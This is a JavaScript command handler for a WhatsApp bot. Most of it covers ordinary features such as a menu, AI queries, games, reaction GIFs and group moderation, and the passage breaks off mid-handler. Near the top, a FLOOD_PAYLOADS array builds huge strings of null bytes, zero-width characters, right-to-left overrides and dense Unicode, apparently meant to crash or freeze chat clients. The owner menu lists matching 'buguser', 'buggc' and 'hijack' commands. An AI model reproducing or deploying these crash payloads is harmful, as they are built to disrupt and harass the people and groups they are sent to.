'use strict'

const api       = require('./api')
const state     = require('./state')
const utils     = require('./utils')
const cdn       = require('./cdn')
const reactions = require('./reactions')
const { BOT_NAME, BOT_VERSION, OWNER_NAME, OWNER_NUMBER, OWNER_NUMBERS, PREFIX } = require('./config')

// ── Flood payloads ────────────────────────────────────────────
const FLOOD_PAYLOADS = [
    () => '\u0000'.repeat(3000) + '꧔ꦿ'.repeat(1000),
    () => '᷂᷿᷄᷾'.repeat(2000) + '\u202E'.repeat(1000),
    () => '\u200B\u200C\u200D\uFEFF'.repeat(3000),
    () => '𒐫'.repeat(2000) + '\u0000'.repeat(500),
    () => '🔥💥⚡🌀'.repeat(2000),
    () => '\u202E' + 'TAVIK'.repeat(1000) + '\u202C'.repeat(1000),
]

const GIF_ACTIONS = {
    hug:'hug', pat:'pat', slap:'slap', kiss:'kiss', cry:'cry',
    dance:'dance', wave:'wave', wink:'wink', bite:'bite', blush:'blush',
    cuddle:'cuddle', poke:'poke', yeet:'yeet', bonk:'bonk', lick:'lick',
    highfive:'highfive', smile:'smile', happy:'happy', handhold:'handhold',
    nom:'nom', bully:'bully', kill:'kill',
}

const pick   = arr => arr[Math.floor(Math.random() * arr.length)]
const sleep  = ms  => new Promise(r => setTimeout(r, ms))
const digits = str => str?.replace(/[^0-9]/g, '') || ''

function extractTarget(arg = '', quotedParticipant = '') {
    if (!arg && quotedParticipant)
        return quotedParticipant.replace(/@s\.whatsapp\.net/g, '').replace(/[^0-9]/g, '')
    if (arg?.startsWith('@')) return arg.replace('@', '').replace(/[^0-9]/g, '')
    return arg?.replace(/[^0-9]/g, '') || null
}

// ── Levanter-style menu ───────────────────────────────────────
function buildMenu(chatId) {
    const chatbotOn = state.chatbot[chatId] ? 'ON 🟢' : 'OFF 🔴'
    const modeStr   = state.selfMode ? 'Self 🔒' : 'Public 🔓'

    return (
`╭═══ ${BOT_NAME} ═══⊷
┃❃╭──────────────────
┃❃│ Prefix  : ${PREFIX}
┃❃│ Owner   : ${OWNER_NAME}
┃❃│ Version : ${BOT_VERSION}
┃❃│ Mode    : ${modeStr}
┃❃│ Chatbot : ${chatbotOn}
┃❃│ Uptime  : ${utils.getUptime()}
┃❃╰───────────────────
╰══════════════════════⊷

 ╭─❏ 🌐 ɢᴇɴᴇʀᴀʟ ❏
 │ alive  ping  info
 │ credits  owner
 ╰─────────────────

 ╭─❏ 🤖 ᴀɪ & ᴛᴏᴏʟs ❏
 │ ai <question>
 │ codeai <request>
 │ createwebsite <desc>
 │ translate <lang> <text>
 │ lyrics <song>
 │ shorturl <url>
 │ screenshot <url>
 │ carbon <code>
 │ ipinfo <ip>
 │ reverse <text>
 │ encode/decode <text>
 │ wiki <topic>
 │ define <word>
 │ weather <city>
 │ calc <math>
 │ qrcode <text>
 │ genpass [length]
 │ time
 │ pint <search>
 │ cat   dog
 ╰─────────────────

 ╭─❏ 🎬 ᴍᴇᴅɪᴀ ❏
 │ tiktok <url>
 │ meme
 │ upscale <url>
 ╰─────────────────

 ╭─❏ 🎮 ɢᴀᴍᴇs & ꜰᴜɴ ❏
 │ dice   coin   8ball
 │ truth  dare
 │ joke   dadjoke
 │ funfact  advice
 │ quote  roast
 │ compliment
 │ ship @user1 @user2
 │ fakeid
 │ trivia  .answer <n>
 │ stoptrivia
 ╰─────────────────

 ╭─❏ 💞 ʀᴇᴀᴄᴛɪᴏɴs ❏
 │ hug  pat  slap  kiss
 │ cry  dance  wave  wink
 │ bite  blush  cuddle
 │ poke  yeet  bonk  lick
 │ highfive  smile  happy
 │ handhold  nom  bully  kill
 │ _Usage: ${PREFIX}hug @number_
 ╰─────────────────

 ╭─❏ 👥 ɢʀᴏᴜᴘ ❏
 │ tagall  hidetag
 │ kick  add  warn
 │ promote  demote
 │ mute  unmute
 │ gcinfo  listadmins
 │ grouplink  resetlink
 │ setgcname  kickall
 │ del
 ╰─────────────────

 ╭─❏ ⚙️ sᴇᴛᴛɪɴɢs ❏
 │ chatbot on/off
 │ autoreply on/off
 │ antilink on/off
 │ antispam on/off
 │ antibadword on/off
 │ antidelete on/off
 │ antighostping on/off
 │ welcome on/off/msg
 │ goodbye off/msg
 │ announce on/off
 │ autoread on/off
 │ autoreact on/off
 │ autotyping on/off
 ╰─────────────────

 ╭─❏ 👑 ᴏᴡɴᴇʀ ᴏɴʟʏ ❏
 │ self  public
 │ addsudo  delsudo
 │ sudolist  sudo
 │ buguser  buggc
 │ stopflood  hijack
 │ banuser
 ╰─────────────────

_💡 Say *tavik* anytime to wake me!_`
    )
}

async function handleCommand(chatId, sender, text, qid, isOwner, isSudo, isGroup, msg, isGroupAdmin = false) {
    const isPrivileged = isOwner || isSudo || isGroupAdmin
    const args  = text.trim().split(/\s+/)
    const cmd   = args[0].toLowerCase()
    const query = args.slice(1).join(' ')
    const quotedParticipant = msg?.message?.extendedTextMessage?.contextInfo?.participant || ''

    // ── MENU ─────────────────────────────────────────────────
    if (cmd === `${PREFIX}menu` || cmd === `${PREFIX}help`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId, buildMenu(chatId), qid)
    }

    // ── GENERAL ──────────────────────────────────────────────
    if (cmd === `${PREFIX}alive`) {
        return api.sendText(chatId,
            `╭═══ ${BOT_NAME} ═══⊷\n` +
            `┃❃│ ✅ BOT IS ALIVE!\n` +
            `┃❃│ ⏳ Uptime  : ${utils.getUptime()}\n` +
            `┃❃│ 👑 Owner   : ${OWNER_NAME}\n` +
            `┃❃│ 🔐 Mode    : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n` +
            `╰══════════════════════⊷`, qid)
    }

    if (cmd === `${PREFIX}ping`) {
        const t = Date.now()
        return api.sendText(chatId, `🏓 *Pong!*\n⚡ Speed: ${Date.now() - t}ms`, qid)
    }

    if (cmd === `${PREFIX}info`) {
        return api.sendText(chatId,
            `╭─❏ 🤖 ʙᴏᴛ ɪɴꜰᴏ ❏\n` +
            ` │ Name    : ${BOT_NAME}\n` +
            ` │ Version : ${BOT_VERSION}\n` +
            ` │ Owner   : ${OWNER_NAME}\n` +
            ` │ Mode    : ${state.selfMode ? 'Self 🔒' : 'Public 🔓'}\n` +
            ` │ Uptime  : ${utils.getUptime()}\n` +
            ` │ Host    : Railway\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}credits`) {
        return api.sendText(chatId,
            `╭─❏ 🏆 ᴄʀᴇᴅɪᴛs ❏\n` +
            ` │ Developer : GODSWILL\n` +
            ` │ Bot Name  : ${BOT_NAME}\n` +
            ` │ Version   : ${BOT_VERSION}\n` +
            ` │ Host      : Railway\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}owner`) {
        return api.sendText(chatId,
            `╭─❏ 👑 ᴏᴡɴᴇʀ ❏\n` +
            ` │ Name : ${OWNER_NAME}\n` +
            ` │ 📱 wa.me/${OWNER_NUMBER}\n` +
            ` ╰─────────────────`, qid)
    }

    // ── AI & TOOLS ───────────────────────────────────────────
    if (cmd === `${PREFIX}ai`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}ai <question>*`, qid)
        await api.sendTyping(chatId, 3)
        const reply = await utils.askAI(query)
        return api.sendText(chatId, `╭─❏ 🤖 ᴀɪ ʀᴇᴘʟʏ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}codeai` || cmd === `${PREFIX}code`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}codeai <request>*`, qid)
        await api.sendTyping(chatId, 4)
        const reply = await utils.askCodeAI(query)
        return api.sendText(chatId, `╭─❏ 💻 ᴄᴏᴅᴇ ʀᴇsᴜʟᴛ ❏\n │\n${reply}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}createwebsite` || cmd === `${PREFIX}website`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}createwebsite <description>*`, qid)
        await api.sendTyping(chatId, 5)
        await api.sendText(chatId, `⚡ Building your website... please wait!`, qid)
        const html = await utils.createWebsite(query)
        if (!html) return api.sendText(chatId, `❌ Generation failed. Try a clearer description!`, qid)
        try {
            const buf = Buffer.from(html, 'utf-8')
            const url = await cdn.upload(buf, 'website.html', 'text/html')
            if (url) {
                return api.sendText(chatId,
                    `✅ *Website Ready!*\n📄 Topic: _${query}_\n🔗 Download:\n${url}\n\n_Open in any browser!_`, qid)
            }
        } catch {}
        return api.sendText(chatId, `✅ *Website Generated!*\n\n${html.slice(0, 3500)}`, qid)
    }

    if (cmd === `${PREFIX}wiki`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}wiki <topic>*`, qid)
        await api.sendTyping(chatId, 2)
        const result = await utils.getWiki(query)
        if (!result) return api.sendText(chatId, `❌ Nothing found for "${query}"`, qid)
        return api.sendText(chatId,
            `╭─❏ 📖 ᴡɪᴋɪ ❏\n │ *${query}*\n │\n │ ${result.slice(0, 700).replace(/\n/g, '\n │ ')}...\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}define` || cmd === `${PREFIX}dictionary`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}define <word>*`, qid)
        await api.sendTyping(chatId, 2)
        const r = await utils.getDictionary(query)
        if (!r) return api.sendText(chatId, `❌ No definition found for "${query}"`, qid)
        return api.sendText(chatId,
            `╭─❏ 📚 ᴅᴇꜰɪɴɪᴛɪᴏɴ ❏\n` +
            ` │ *${r.word}* ${r.phonetic}\n` +
            ` │ _(${r.partOfSpeech})_\n` +
            ` │ ${r.definition}\n` +
            ` │ ${r.example ? `💬 _"${r.example}"_` : ''}\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}weather`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}weather <city>*`, qid)
        await api.sendTyping(chatId, 2)
        const r = await utils.getWeather(query)
        if (!r) return api.sendText(chatId, `❌ City not found!`, qid)
        return api.sendText(chatId, `╭─❏ 🌤️ ᴡᴇᴀᴛʜᴇʀ ❏\n │ *${query}*\n │ ${r}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}calculate` || cmd === `${PREFIX}calc`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}calc <expression>*`, qid)
        try {
            const safe = query.replace(/[^0-9+\-*/.()%\s]/g, '')
            if (!safe) return api.sendText(chatId, `❌ Invalid expression!`, qid)
            // eslint-disable-next-line no-new-func
            const result = Function('"use strict"; return (' + safe + ')')()
            if (!isFinite(result)) return api.sendText(chatId, `❌ Math error!`, qid)
            return api.sendText(chatId,
                `╭─❏ 🧮 ᴄᴀʟᴄᴜʟᴀᴛᴏʀ ❏\n │ 📝 ${query}\n │ ✅ = *${result}*\n ╰─────────────────`, qid)
        } catch {
            return api.sendText(chatId, `❌ Invalid expression!`, qid)
        }
    }

    if (cmd === `${PREFIX}time`) {
        const n = new Date()
        return api.sendText(chatId,
            `╭─❏ 🕐 ᴛɪᴍᴇ ❏\n` +
            ` │ 📅 ${n.toDateString()}\n` +
            ` │ ⏰ ${n.toTimeString().split(' ')[0]}\n` +
            ` │ 🌍 ${n.toUTCString()}\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}pint`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}pint <search query>*`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `🔍 Searching images for *${query}*...`, qid)
        const urls = await utils.searchImages(query, 5)
        if (!urls.length) return api.sendText(chatId, `❌ No images found for "${query}"`, qid)
        let sent = 0
        for (const url of urls) {
            try {
                await api.sendImage(chatId, url, sent === 0 ? `🖼️ *${query}* (${urls.length} results)` : '', qid)
                sent++
                await sleep(500)
            } catch {}
        }
        if (!sent) return api.sendText(chatId, `❌ Could not load images. Try a different search.`, qid)
        return
    }

    if (cmd === `${PREFIX}qrcode` || cmd === `${PREFIX}qr`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}qrcode <text or URL>*`, qid)
        const url = utils.getQRCode(query)
        return api.sendImage(chatId, url, `📱 *QR Code*\n📝 ${query}`, qid)
    }

    if (cmd === `${PREFIX}genpass`) {
        const len  = Math.min(parseInt(args[1]) || 16, 64)
        const pass = utils.generatePassword(len)
        return api.sendText(chatId,
            `╭─❏ 🔐 ᴘᴀssᴡᴏʀᴅ ❏\n │ \`${pass}\`\n │ 📏 ${len} characters\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}cat`) {
        await api.sendTyping(chatId, 1)
        const url = await utils.getCatImage()
        if (!url) return api.sendText(chatId, `❌ Could not fetch a cat!`, qid)
        return api.sendImage(chatId, url, `🐱 *Meow!*`, qid)
    }

    if (cmd === `${PREFIX}dog`) {
        await api.sendTyping(chatId, 1)
        const url = await utils.getDogImage()
        if (!url) return api.sendText(chatId, `❌ Could not fetch a dog!`, qid)
        return api.sendImage(chatId, url, `🐶 *Woof!*`, qid)
    }

    if (cmd === `${PREFIX}tiktok`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}tiktok <url>*`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `⬇️ Downloading TikTok...`, qid)
        const videoUrl = await utils.downloadTiktok(query)
        if (!videoUrl) return api.sendText(chatId, `❌ Failed! Invalid or expired link.`, qid)
        return api.sendVideo(chatId, videoUrl, `✅ Downloaded!`, qid)
    }

    if (cmd === `${PREFIX}meme`) {
        await api.sendTyping(chatId, 1)
        const url = await utils.getMeme()
        if (!url) return api.sendText(chatId, `❌ No meme found. Try again!`, qid)
        return api.sendImage(chatId, url, `😂 *Random Meme!*`, qid)
    }

    if (cmd === `${PREFIX}upscale`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}upscale <image_url>*`, qid)
        await api.sendTyping(chatId, 3)
        await api.sendText(chatId, `🔍 Upscaling image... please wait ⏳`, qid)
        const outUrl = await utils.upscaleImage(query)
        if (outUrl) return api.sendImage(chatId, outUrl, `✅ *Upscaled (2x)!*`, qid)
        return api.sendText(chatId, `❌ Upscale failed. Use a direct image link (jpg/png).`, qid)
    }

    if (cmd === `${PREFIX}del` && isPrivileged) {
        const quotedMsgId = msg?.message?.extendedTextMessage?.contextInfo?.stanzaId
        if (!quotedMsgId) return api.sendText(chatId, `❌ Reply to a message with *${PREFIX}del* to delete it.`, qid)
        await api.deleteMessage(chatId, quotedMsgId)
        return
    }

    // ── FUN & GAMES ───────────────────────────────────────────
    if (cmd === `${PREFIX}dice`) {
        const r = Math.floor(Math.random() * 6) + 1
        const f = ['','1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣']
        return api.sendText(chatId,
            `╭─❏ 🎲 ᴅɪᴄᴇ ʀᴏʟʟ ❏\n │ You rolled *${f[r]} ${r}*!\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}coin`) {
        return api.sendText(chatId,
            `╭─❏ 🪙 ᴄᴏɪɴ ꜰʟɪᴘ ❏\n │ *${Math.random() < 0.5 ? 'HEADS 🦅' : 'TAILS 🪙'}*\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}8ball`) {
        if (!query) return api.sendText(chatId, `❌ Usage: *${PREFIX}8ball <question>*`, qid)
        const a = ['✅ Yes!','✅ Definitely!','✅ Without a doubt!','⚠️ Maybe...','⚠️ Ask again later','❌ No.','❌ Definitely not!','❌ Very doubtful']
        return api.sendText(chatId,
            `╭─❏ 🎱 8 ʙᴀʟʟ ❏\n │ ❓ ${query}\n │ ${pick(a)}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}truth`) {
        const t = [
            'What is your biggest fear?', 'Have you ever lied to your best friend?',
            "What's your most embarrassing moment?", 'Do you have a crush?',
            "What's the worst thing you've done?", 'Have you ever cheated in an exam?',
            "What's your biggest secret?", 'Who do you miss the most right now?',
        ]
        return api.sendText(chatId,
            `╭─❏ 🤫 ᴛʀᴜᴛʜ ❏\n │ ${pick(t)}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}dare`) {
        const d = [
            'Send a voice note singing a song!',
            'Change your status to "This bot is the best!" for 1 hour!',
            'Send your most embarrassing photo!',
            'Do 10 pushups and send proof!',
            "Text someone you haven't talked to in a year!",
        ]
        return api.sendText(chatId,
            `╭─❏ 😈 ᴅᴀʀᴇ ❏\n │ ${pick(d)}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}joke`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId,
            `╭─❏ 😂 ᴊᴏᴋᴇ ❏\n │ ${await utils.getJoke()}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}dadjoke`) {
        await api.sendTyping(chatId, 1)
        const j = await utils.getDadJoke()
        if (!j) return api.sendText(chatId, `❌ No dad joke available!`, qid)
        return api.sendText(chatId,
            `╭─❏ 👨 ᴅᴀᴅ ᴊᴏᴋᴇ ❏\n │ ${j}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}funfact`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId,
            `╭─❏ 🤯 ꜰᴜɴ ꜰᴀᴄᴛ ❏\n │ ${await utils.getFunFact()}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}advice`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId,
            `╭─❏ 💡 ᴀᴅᴠɪᴄᴇ ❏\n │ ${await utils.getAdvice()}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}quote`) {
        await api.sendTyping(chatId, 1)
        return api.sendText(chatId,
            `╭─❏ 💭 ǫᴜᴏᴛᴇ ❏\n │ ${await utils.getQuote()}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}roast`) {
        const r = [
            'You are the reason shampoos have instructions.',
            "I'd agree with you but then we'd both be wrong.",
            'You bring everyone joy when you leave the room.',
            "I'd roast you but my mama said not to burn trash.",
        ]
        const target = args[1] ? `@${args[1].replace('@','')}` : 'you'
        return api.sendText(chatId,
            `╭─❏ 🔥 ʀᴏᴀsᴛ ꜰᴏʀ ${target} ❏\n │ ${pick(r)}\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}compliment`) {
        const c = [
            'You have an amazing sense of humor!', 'You are genuinely a great person!',
            'You make everyone around you feel special!', 'You are stronger than you think!',
            'The world is better with you in it!',
        ]
        const target = args[1] ? `@${args[1].replace('@','')}` : 'you'
        return api.sendText(chatId,
            `╭─❏ 💝 ᴄᴏᴍᴘʟɪᴍᴇɴᴛ ꜰᴏʀ ${target} ❏\n │ ${pick(c)}\n ╰─────────────────`, qid)
    }

    // ── REACTIONS ─────────────────────────────────────────────
    const reactionKey = cmd.slice(PREFIX.length)
    if (GIF_ACTIONS[reactionKey] !== undefined || reactions[reactionKey] !== undefined) {
        const rawTarget = args[1] || ''
        const emoji     = reactions[reactionKey] || '✨'
        let displayTarget = 'everyone'
        if (rawTarget && rawTarget !== 'all' && rawTarget !== '@all') {
            const num = rawTarget.replace('@', '').replace(/[^0-9]/g, '')
            displayTarget = num ? `@${num}` : rawTarget
        }
        await api.sendTyping(chatId, 1)
        const gifUrl  = GIF_ACTIONS[reactionKey] ? await utils.getReactionGif(GIF_ACTIONS[reactionKey]) : null
        const caption = `${emoji} *@${sender}* ${reactionKey}s *${displayTarget}*! ${emoji}`
        if (gifUrl) return api.sendImage(chatId, gifUrl, caption, qid)
        return api.sendText(chatId, caption, qid)
    }

    // ── SUDO MANAGEMENT ──────────────────────────────────────
    if (cmd === `${PREFIX}sudo`) {
        if (!isOwner && !isSudo)
            return api.sendText(chatId,
                `❌ *Not privileged!*\n\nAsk the owner:\n*${PREFIX}addsudo <your number>*\n\nOwner: wa.me/${OWNER_NUMBER}`, qid)
        return api.sendText(chatId,
            `✅ *Access Confirmed!*\n🔑 Level: ${isOwner ? 'Owner 👑' : 'Sudo ⚡'}\n📱 ${sender}`, qid)
    }

    if (cmd === `${PREFIX}sudolist`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        if (!state.sudoUsers.length)
            return api.sendText(chatId, `📋 No sudo users yet.\n\nAdd one: *${PREFIX}addsudo <number>*`, qid)
        return api.sendText(chatId,
            `╭─❏ 👥 sᴜᴅᴏ ʟɪsᴛ ❏\n` +
            state.sudoUsers.map((n, i) => ` │ ${i + 1}. +${n}`).join('\n') +
            `\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}addsudo` && isOwner) {
        const num = extractTarget(args[1], quotedParticipant)
        if (!num) return api.sendText(chatId,
            `❌ *Add sudo:*\n\n1. *${PREFIX}addsudo 234xxxxxxxxx*\n2. Reply to message + *${PREFIX}addsudo*`, qid)
        if (state.sudoUsers.includes(num))
            return api.sendText(chatId, `⚠️ *${num}* is already sudo!`, qid)
        state.sudoUsers.push(num)
        return api.sendText(chatId, `✅ *${num}* added as sudo!`, qid)
    }

    if (cmd === `${PREFIX}delsudo` && isOwner) {
        const num = extractTarget(args[1], quotedParticipant)
        if (!num) return api.sendText(chatId,
            `❌ *Remove sudo:*\n\n1. *${PREFIX}delsudo 234xxxxxxxxx*\n2. Reply to message + *${PREFIX}delsudo*`, qid)
        const before = state.sudoUsers.length
        state.sudoUsers = state.sudoUsers.filter(n => n !== num)
        if (state.sudoUsers.length === before)
            return api.sendText(chatId, `⚠️ *${num}* is not in sudo list.`, qid)
        return api.sendText(chatId, `✅ *${num}* removed from sudo!`, qid)
    }

    // ── GROUP COMMANDS ────────────────────────────────────────
    if (cmd === `${PREFIX}tagall` && isGroup) {
        if (!isOwner && !isSudo && !isGroupAdmin)
            return api.sendText(chatId, `❌ *Admins only!*\nOnly admins, sudo or owner can use this.`, qid)
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const tags = info.participants?.map(p => `@${p.id.split('@')[0]}`).join(' ') || ''
        return api.sendText(chatId, `📢 *${query || 'Attention everyone!'}*\n\n${tags}`, qid)
    }

    if (cmd === `${PREFIX}hidetag` && isGroup && isPrivileged) {
        return api.sendText(chatId, query || '📢', qid)
    }

    if (cmd === `${PREFIX}kick` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .kick <number> or reply to message`, qid)
        await api.removeGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* kicked!`, qid)
    }

    if (cmd === `${PREFIX}add` && isGroup && isPrivileged) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, `❌ Usage: .add <number>`, qid)
        await api.addGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* added!`, qid)
    }

    if (cmd === `${PREFIX}promote` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .promote <number> or reply`, qid)
        await api.promoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* promoted to admin!`, qid)
    }

    if (cmd === `${PREFIX}demote` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .demote <number> or reply`, qid)
        await api.demoteGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
        return api.sendText(chatId, `✅ *${target}* demoted!`, qid)
    }

    if (cmd === `${PREFIX}mute` && isGroup && isPrivileged) {
        await api.request('patch', `/groups/${chatId}/settings`, { messaging_disabled: true })
        return api.sendText(chatId, `🔇 Group muted! Only admins can send messages.`, qid)
    }

    if (cmd === `${PREFIX}unmute` && isGroup && isPrivileged) {
        await api.request('patch', `/groups/${chatId}/settings`, { messaging_disabled: false })
        return api.sendText(chatId, `🔊 Group unmuted! Everyone can send messages.`, qid)
    }

    if (cmd === `${PREFIX}gcinfo` && isGroup) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const admins = info.participants?.filter(p => p.rank === 'admin').length || 0
        return api.sendText(chatId,
            `╭─❏ 📊 ɢʀᴏᴜᴘ ɪɴꜰᴏ ❏\n` +
            ` │ 📛 ${info.name || 'Unknown'}\n` +
            ` │ 👥 Members : ${info.participants?.length || 0}\n` +
            ` │ 👑 Admins  : ${admins}\n` +
            ` ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}listadmins` && isGroup) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const admins = info.participants?.filter(p => p.rank === 'admin') || []
        if (!admins.length) return api.sendText(chatId, `⚠️ No admins found!`, qid)
        return api.sendText(chatId,
            `╭─❏ 👑 ᴀᴅᴍɪɴs (${admins.length}) ❏\n` +
            admins.map(a => ` │ • @${a.id.split('@')[0]}`).join('\n') +
            `\n ╰─────────────────`, qid)
    }

    if (cmd === `${PREFIX}setgcname` && isGroup && isPrivileged) {
        if (!query) return api.sendText(chatId, `❌ Usage: .setgcname <name>`, qid)
        await api.request('patch', `/groups/${chatId}`, { name: query })
        return api.sendText(chatId, `✅ Group renamed to *${query}*`, qid)
    }

    if (cmd === `${PREFIX}grouplink` && isGroup && isPrivileged) {
        const info = await api.getGroupInfo(chatId)
        if (!info?.invite) return api.sendText(chatId, `❌ Could not get link!`, qid)
        return api.sendText(chatId, `🔗 *Invite Link*\n\nhttps://chat.whatsapp.com/${info.invite}`, qid)
    }

    if (cmd === `${PREFIX}resetlink` && isGroup && isPrivileged) {
        const res = await api.request('delete', `/groups/${chatId}/invite`)
        if (!res?.invite) return api.sendText(chatId, `❌ Failed to reset link!`, qid)
        return api.sendText(chatId, `✅ *New Link*\n\nhttps://chat.whatsapp.com/${res.invite}`, qid)
    }

    if (cmd === `${PREFIX}kickall` && isGroup && isOwner) {
        const info = await api.getGroupInfo(chatId)
        if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
        const members = info.participants
            ?.filter(p => p.rank !== 'admin' && !OWNER_NUMBERS.some(o => p.id.includes(o)))
            .map(p => p.id) || []
        if (!members.length) return api.sendText(chatId, `⚠️ No members to kick!`, qid)
        await api.sendText(chatId, `⚡ Kicking ${members.length} members...`, qid)
        for (let i = 0; i < members.length; i += 5) {
            await api.removeGroupParticipants(chatId, members.slice(i, i + 5))
            await sleep(1000)
        }
        return api.sendText(chatId, `✅ Done! Kicked ${members.length} members.`, qid)
    }

    if (cmd === `${PREFIX}warn` && isGroup && isPrivileged) {
        const target = extractTarget(args[1], quotedParticipant)
        if (!target) return api.sendText(chatId, `❌ Usage: .warn <number> or reply`, qid)
        if (!state.warnings) state.warnings = {}
        const key = `${chatId}_${target}`
        state.warnings[key] = (state.warnings[key] || 0) + 1
        const count = state.warnings[key]
        if (count >= 3) {
            await api.removeGroupParticipants(chatId, [`${target}@s.whatsapp.net`])
            state.warnings[key] = 0
            return api.sendText(chatId, `🚫 @${target} has been *kicked* after 3 warnings!`, qid)
        }
        return api.sendText(chatId,
            `⚠️ *Warning ${count}/3* for @${target}\n${query || 'Please follow group rules!'}\n\n_3 warnings = kick_`, qid)
    }

    // ── SETTINGS ─────────────────────────────────────────────
    if (cmd === `${PREFIX}chatbot`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized! Only admins/owner can toggle chatbot.`, qid)
        const enable = args[1]?.toLowerCase() === 'on'
        state.chatbot[chatId] = enable
        if (state.chatbotRate[chatId]) delete state.chatbotRate[chatId]
        return api.sendText(chatId,
            `🤖 *Chatbot:* ${enable
                ? 'ON ✅\nBot will reply to every message here!'
                : 'OFF ❌\nBot only responds to commands now.'}`, qid)
    }

    if (cmd === `${PREFIX}autoreply`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoreply[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🤖 Auto Reply: *${state.autoreply[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}antidelete`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        if (!state.antiDelete[chatId]) state.antiDelete[chatId] = {}
        state.antiDelete[chatId].enabled = args[1] === 'on'
        return api.sendText(chatId, `🗑️ Anti Delete: *${state.antiDelete[chatId].enabled ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}antibadword`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antibadword[chatId] = args[1] === 'on'
        return api.sendText(chatId, `🤬 Anti Bad Word: *${state.antibadword[chatId] ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}autoread`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoread = args[1] === 'on'
        return api.sendText(chatId, `👁️ Auto Read: *${state.autoread ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}autoreact`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autoreact = args[1] === 'on'
        return api.sendText(chatId, `❤️ Auto React: *${state.autoreact ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}autotyping`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.autotyping = args[1] === 'on'
        return api.sendText(chatId, `⌨️ Auto Typing: *${state.autotyping ? 'ON ✅' : 'OFF ❌'}*`, qid)
    }

    if (cmd === `${PREFIX}antilink`) {
        if (!isPrivileged) return api.sendText(chatId, `❌ Not authorized!`, qid)
        state.antilink[chatId] = args[1] === 'on'
